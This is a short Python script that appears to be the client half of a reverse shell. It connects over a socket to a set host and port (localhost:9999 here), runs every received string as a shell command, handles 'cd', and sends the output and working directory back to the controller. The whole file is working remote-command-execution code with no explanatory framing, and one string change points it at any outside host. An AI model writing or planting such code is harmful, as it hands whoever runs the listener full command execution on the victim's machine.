import os
import socket
import subprocess


host = "localhost"
port = 9999
skt = socket.socket()
skt.connect((host, port))

while True:
    data = skt.recv(1024)
    print(":$", data.decode())
    if data[:2].decode() == 'cd':
        os.chdir(data[3:].decode())
    elif data.decode() == 'q':
        break
    if data:
        cmd = subprocess.Popen(data.decode(), shell=True,\
              stdin=subprocess.PIPE, stdout=subprocess.PIPE,\
              stderr=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()
        skt.send(output + os.getcwd().encode() + b':$ ')
        print(output.decode(), end='')

skt.close()
print("Connection is closed")
